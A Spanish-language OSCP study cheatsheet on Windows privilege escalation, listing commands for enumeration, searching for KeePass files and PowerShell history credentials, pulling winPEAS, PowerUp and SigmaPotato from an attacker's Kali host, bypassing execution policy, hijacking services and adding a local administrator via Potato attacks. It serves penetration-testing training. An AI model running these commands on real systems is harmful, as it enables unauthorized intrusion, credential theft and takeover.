---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Privesc Windows

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Situational awareness
```powershell
whoami ; whoami /groups ; whoami /priv
Get-LocalUser ; Get-LocalGroup ; Get-LocalGroupMember <grupo>
systeminfo ; ipconfig /all ; route print ; netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
```

## Información sensible
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
net user <usuario>                       # grupos de otro user sin ser admin
runas /user:<dom\user> cmd                # ejecutar como otro user (requiere GUI)
```

## PowerShell: historial y transcripts
```powershell
(Get-PSReadlineOption).HistorySavePath
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$password = ConvertTo-SecureString "<pwd>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<user>", $password)
Enter-PSSession -ComputerName <host> -Credential $cred
```
```bash
evil-winrm -i <ip> -u <user> -p "<password>"
```

## Enumeración automatizada
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe . ; python3 -m http.server 80
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 . ; python3 -m http.server 80
```
```powershell
iwr -uri http://<IP_kali>/winPEAS.exe -Outfile winPEAS.exe ; .\winPEAS.exe
iwr -uri http://<IP_kali>/PowerUp.ps1 -Outfile PowerUp.ps1 ; powershell -ep bypass ; . .\PowerUp.ps1
Get-ModifiableServiceFile ; Get-UnquotedService
Install-ServiceBinary -Name '<svc>' ; Write-ServiceBinary -Name '<svc>' -Path '<exe>'
```

## Servicios: permisos y arranque
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode
icacls "<ruta_binario>"
Start-Service <svc> ; Stop-Service <svc> ; Restart-Service <svc>
whoami /priv          # SeShutdownPrivilege
shutdown /r /t 0        # reiniciar si no se puede parar/arrancar el servicio
```

## Unquoted service paths
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
```

## Scheduled tasks
```powershell
schtasks /query /fo LIST /v
```

## Exploits
```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

## Potato attacks (SeImpersonatePrivilege)
```powershell
whoami /priv
iwr -uri http://<IP_kali>/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user <u> <p> /add" ; .\SigmaPotato "net localgroup Administrators <u> /add"
```

## Cross-compilar binario/DLL maliciosos (desde Kali)
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
x86_64-w64-mingw32-gcc dll.cpp --shared -o dll_name.dll
```
